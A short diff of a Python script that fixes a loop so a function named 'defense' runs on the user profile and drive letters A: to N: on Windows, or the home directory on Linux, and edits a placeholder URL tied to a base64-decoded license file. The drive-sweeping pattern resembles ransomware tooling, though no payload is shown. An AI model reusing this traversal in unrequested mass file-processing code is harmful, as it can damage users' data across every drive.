@@ -17,7 +17,7 @@ def gext(filename):
 def gl(filename):
     # On Website
     try:
-        url_web = "Your URL"
+        url_web = "YOUR URL"
         with open(filename,'r') as license:
             ler = license.read()
             len = base64.b64decode(ler.encode('utf-8'))
@@ -66,10 +66,10 @@ if __name__ == '__main__':
     if (platform == 'win32'):
         t = [os.environ["USERPROFILE"],"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:"]
         for i in range(len(t)):
-            defense(t0)
+            defense(t[i] + '\\')
     elif (platform == 'linux'):
         t = ['~']
         for i in range(len(t)):
-            defense(t0)
+            defense(t[i] + '/')
     else:
         print('I will better')
